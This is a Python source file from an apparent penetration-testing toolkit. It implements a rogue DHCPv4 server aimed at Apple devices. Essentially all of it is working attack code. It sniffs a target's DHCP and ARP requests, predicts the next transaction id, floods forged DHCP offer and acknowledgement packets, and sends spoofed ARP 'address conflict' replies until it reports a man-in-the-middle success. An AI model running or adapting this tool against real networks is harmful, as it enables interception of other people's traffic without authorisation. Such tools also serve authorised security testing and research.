#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
apple_dhcp_server.py: Rogue DHCPv4 server for Apple devices (apple_dhcp_server)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.network import RawSniff, RawSend, RawARP, RawDHCPv4
from raw_packet.Utils.tm import ThreadManager
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from time import sleep
from datetime import datetime
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'Rogue DHCPv4 server for Apple devices (apple_dhcp_server)'
# endregion


# region class AppleDHCPServer
class AppleDHCPServer:

    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    _utils: Utils = Utils()
    _arp: RawARP = RawARP()
    _sniff: RawSniff = RawSniff()
    _dhcpv4: RawDHCPv4 = RawDHCPv4()
    _thread_manager: ThreadManager = ThreadManager(15)

    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None, 'ipv4-address': None}
    _target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None}
    
    _requested_ip: Union[None, str] = None
    _new_transaction_id: int = 0

    _print_possible_mitm: bool = False
    _print_success_mitm: bool = False
    _broadcast: bool = False
    _quiet: bool = False
    # endregion

    # region Init
    def __init__(self, network_interface: str) -> None:
        """
        Init
        :param network_interface: Network interface name (example: 'eth0')
        """
        self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                       required_parameters=['mac-address',
                                                                            'ipv4-address',
                                                                            'first-ipv4-address',
                                                                            'last-ipv4-address'])
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion

    # region Start
    def start(self, 
              target_ip_address: str,
              target_mac_address: str,
              broadcast: bool = False,
              quiet: bool = False):

        try:

            # region Set variables
            self._broadcast = broadcast
            self._quiet = quiet
            # endregion

            # region Check target MAC and IPv4 address
            self._target['ipv4-address'] = \
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=target_ip_address,
                                               is_local_ipv4_address=True,
                                               parameter_name='target IPv4 address')
            self._target['mac-address'] = \
                self._utils.check_mac_address(mac_address=target_mac_address,
                                              parameter_name='target MAC address')
            # endregion

            # region Start Sniffer
            if not self._quiet:
                self._base.print_info('Waiting for a ARP or DHCPv4 requests from: ', self._target['mac-address'])
            self._sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._reply,
                              filters={'Ethernet': {'source': self._target['mac-address']},
                                       'ARP': {'opcode': 1},
                                       'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
                                       'UDP': {'source-port': 68, 'destination-port': 67}},
                              network_interface=self._your['network-interface'],
                              scapy_filter='arp or (udp and (port 67 or 68))',
                              scapy_lfilter=lambda eth: eth.src == self._target['mac-address'])
            # endregion

        except AssertionError as Error:
            if not self._quiet:
                self._base.print_error(Error.args[0])
            exit(1)

        except KeyboardInterrupt:
            if not self._quiet:
                self._base.print_info('Exit')
            exit(0)

    # endregion

    # region DHCP response sender
    def _dhcp_response_sender(self):
        if self._broadcast:
            offer_packet = self._dhcpv4.make_offer_packet(ethernet_src_mac=self._your['mac-address'],
                                                          ip_src=self._your['ipv4-address'],
                                                          transaction_id=self._new_transaction_id,
                                                          your_client_ip=self._target['ipv4-address'],
                                                          client_mac=self._target['mac-address'])

            ack_packet = self._dhcpv4.make_ack_packet(ethernet_src_mac=self._your['mac-address'],
                                                      ip_src=self._your['ipv4-address'],
                                                      transaction_id=self._new_transaction_id,
                                                      your_client_ip=self._target['ipv4-address'],
                                                      client_mac=self._target['mac-address'])
        else:
            offer_packet = self._dhcpv4.make_offer_packet(ethernet_src_mac=self._your['mac-address'],
                                                          ethernet_dst_mac=self._target['mac-address'],
                                                          ip_src=self._your['ipv4-address'],
                                                          transaction_id=self._new_transaction_id,
                                                          your_client_ip=self._target['ipv4-address'],
                                                          client_mac=self._target['mac-address'])

            ack_packet = self._dhcpv4.make_ack_packet(ethernet_src_mac=self._your['mac-address'],
                                                      ethernet_dst_mac=self._target['mac-address'],
                                                      ip_src=self._your['ipv4-address'],
                                                      transaction_id=self._new_transaction_id,
                                                      your_client_ip=self._target['ipv4-address'],
                                                      client_mac=self._target['mac-address'])
    
        start_time: datetime = datetime.now()

        if self._base.get_platform().startswith('Linux'):
            while (datetime.now() - start_time).seconds <= 15:
                self._raw_send.send_packet(offer_packet)
                self._raw_send.send_packet(ack_packet)
                sleep(0.00001)
        else:
            while (datetime.now() - start_time).seconds <= 15:
                self._raw_send.send_packet(offer_packet)
                self._raw_send.send_packet(ack_packet)
    # endregion
    
    # region Reply to DHCP and ARP requests
    def _reply(self, request: Dict[str, Dict[Union[int, str], Union[int, str]]]):
        
        # region DHCP REQUESTS
        if 'DHCPv4' in request.keys():
    
            # region Get DHCP transaction id
            transaction_id = request['BOOTP']['transaction-id']
            # endregion
    
            # region DHCP DECLINE
            if request['DHCPv4'][53] == 4:
                self._base.print_info('DHCP DECLINE from: ', self._target['mac-address'])
                if self._new_transaction_id != 0:
                    self._thread_manager.add_task(self._dhcp_response_sender)
            # endregion
    
            # region DHCP REQUEST
            if request['DHCPv4'][53] == 3:
    
                # region Get next DHCP transaction id
                if transaction_id != 0:
                    self._new_transaction_id = transaction_id + 1
                    self._base.print_info('Current transaction id: ', hex(transaction_id))
                    self._base.print_success('Next transaction id: ', hex(self._new_transaction_id))
                # endregion
    
                # region Get DHCP requested ip address
                if 50 in request['DHCPv4'].keys():
                    self._requested_ip = str(request['DHCPv4'][50])
                # endregion
    
                # region Print info message
                self._base.print_info('DHCP REQUEST from: ', self._target['mac-address'], 
                                      ' transaction id: ', hex(transaction_id),
                                      ' requested ip: ', self._requested_ip)
                # endregion
    
                # region If requested IP is target IP - print Possible mitm success
                if self._requested_ip == self._target['ipv4-address']:
                    if not self._print_possible_mitm:
                        self._base.print_warning('Possible MiTM success: ', 
                                                 self._target['ipv4-address'] + ' (' + 
                                                 self._target['mac-address'] + ')')
                        self._print_possible_mitm = True
                # endregion
    
            # endregion
    
        # endregion
    
        # region ARP REQUESTS
        if 'ARP' in request.keys():
            if self._requested_ip is not None:
                if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                        request['ARP']['target-mac'] == '00:00:00:00:00:00':
    
                    # region Set local variables
                    arp_sender_mac_address = request['ARP']['sender-mac']
                    arp_sender_ip_address = request['ARP']['sender-ip']
                    arp_target_ip_address = request['ARP']['target-ip']
                    # endregion
    
                    # region Print info message
                    self._base.print_info('ARP request from: ', arp_sender_mac_address, ' "',
                                          'Who has ' + arp_target_ip_address +
                                          '? Tell ' + arp_sender_ip_address, '"')
                    # endregion
    
                    # region ARP target IP is DHCP requested IP
                    if arp_target_ip_address == self._requested_ip:
    
                        # region If ARP target IP is target IP - print Possible mitm success
                        if arp_target_ip_address == self._target['ipv4-address']:
                            if not self._print_possible_mitm:
                                self._base.print_warning('Possible MiTM success: ',
                                                         self._target['ipv4-address'] + ' (' +
                                                         self._target['mac-address'] + ')')
                                self._print_possible_mitm = True
                        # endregion
    
                        # region If ARP target IP is not target IP - send 'IPv4 address conflict' ARP response
                        else:
                            arp_reply = self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                                                ethernet_dst_mac=self._target['mac-address'],
                                                                sender_mac=self._your['mac-address'],
                                                                sender_ip=self._requested_ip,
                                                                target_mac=arp_sender_mac_address,
                                                                target_ip=arp_sender_ip_address)
                            for _ in range(5):
                                self._raw_send.send_packet(arp_reply)
                            self._base.print_info('ARP response to:  ', arp_sender_mac_address, ' "',
                                                  arp_target_ip_address + ' is at ' + self._your['mac-address'],
                                                  '" (IPv4 address conflict)')
                        # endregion
    
                    # endregion
    
                    # region ARP target IP is your IP - MITM SUCCESS
                    if arp_target_ip_address == self._your['ipv4-address']:
                        if not self._print_success_mitm:
                            self._base.print_success('MITM success: ',
                                                     self._target['ipv4-address'] + ' (' +
                                                     self._target['mac-address'] + ')')
                            self._print_success_mitm = True
                        exit(0)
                    # endregion
        # endregion

    # endregion

# endregion


# region Main function
def main() -> None:
    """
    Start Rogue DHCPv4 server for Apple devices (apple_dhcp_server)
    :return: None
    """

    # region Init Raw-packet Base class
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                            formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', type=str, help='Set network interface name', default=None)
    parser.add_argument('-t', '--target_ip', type=str, help='Set new IPv4 address for target', required=True)
    parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', required=True)
    parser.add_argument('-b', '--broadcast', action='store_true', help='Send broadcast DHCPv4 responses')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner
    if not args.quiet:
        base.print_banner(__script_name__)
    # endregion

    # region Set current network interface
    current_network_interface: str = \
        base.network_interface_selection(interface_name=args.interface,
                                         message='Please select a network interface for ' +
                                                 __script_name__ + ' from table: ')
    # endregion

    # region Start Rogue DHCPv4 server for Apple devices
    try:
        apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=current_network_interface)
        apple_dhcp_server.start(target_ip_address=args.target_ip,
                                target_mac_address=args.target_mac,
                                broadcast=args.broadcast,
                                quiet=args.quiet)

    except KeyboardInterrupt:
        if not args.quiet:
            base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        if not args.quiet:
            base.print_error(Error.args[0])
        exit(1)
    # endregion

# endregion


# region Call Main function
if __name__ == '__main__':
    main()
# endregion
